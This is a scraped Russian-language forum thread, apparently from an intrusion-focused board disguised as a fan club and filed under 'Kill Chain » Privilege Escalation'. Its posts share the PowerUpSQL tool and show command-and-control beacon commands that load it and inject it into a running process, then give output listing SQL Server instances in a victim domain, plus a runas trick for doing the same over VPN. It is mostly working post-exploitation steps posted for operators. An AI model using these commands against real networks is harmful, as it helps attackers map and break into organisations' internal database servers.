@@ -1,0 +1,102 @@
+
+
+    Vampir
+    Новые темы
+    Новые ответы
+
+    Начало
+    Помощь
+    Поиск
+    Профиль
+    Личные сообщения
+    Пользователи
+
+Monica Bellucci Fan Club
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Privilege Escalation »
+    PowerUpSQL
+
+PowerUpSQL
+Rozetka · 3 · 41
+« предыдущая тема следующая тема »
+
+Страницы: 1
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+: Февраля 11, 2021, 03:09:57 pm
+Записан
+
+https://github.com/NetSPI/PowerUpSQL/wiki
+who it can show for our
+« Последнее редактирование: Февраля 12, 2021, 07:56:37 pm от Alter »
+
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+Ответ #1 : Июля 01, 2021, 02:26:34 am
+Записан
+
+
+NetSpi PowerSQL::
+1.
+https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1
+powershell-import /home/user/soft/scripts/powerupsql.ps1
+
+2.
+
+beacon> psinject 33700 x64 Get-SQLInstanceDomain -Verbose
+
+    Tasked beacon to psinject: Get-SQLInstanceDomain -Verbose into 33700 (x64)
+    host called home, sent: 134785 bytes
+    received output:
+
+
+VERBOSE: Grabbing SPNs from the domain for SQL Servers (MSSQL*)...
+VERBOSE: Parsing SQL Server instances from SPNs...
+VERBOSE: 5 instances were found.
+
+Rozetka
+
+    Administrator
+    Member
+    *****
+        35
+        Просмотр профиля E-mail Личное сообщение (Оффлайн) 
+
+Ответ #2 : Июля 02, 2021, 04:33:07 pm
+Записан
+
+Из под впна работает также через (граббинг скл серверов в домене)
+Цитировать
+
+    runas /netonly /user:domain.local\user powershell_ise
+
+
+Страницы: 1
+
+    Monica Bellucci Fan Club »
+    Kill Chain »
+    Privilege Escalation »
+    PowerUpSQL
+
+Перейти в:
+ 
++ Быстрый ответ
+
+    SMF 2.0.18 | SMF © 2020, Simple Machines
+    Разработанно с от SychO
+
+
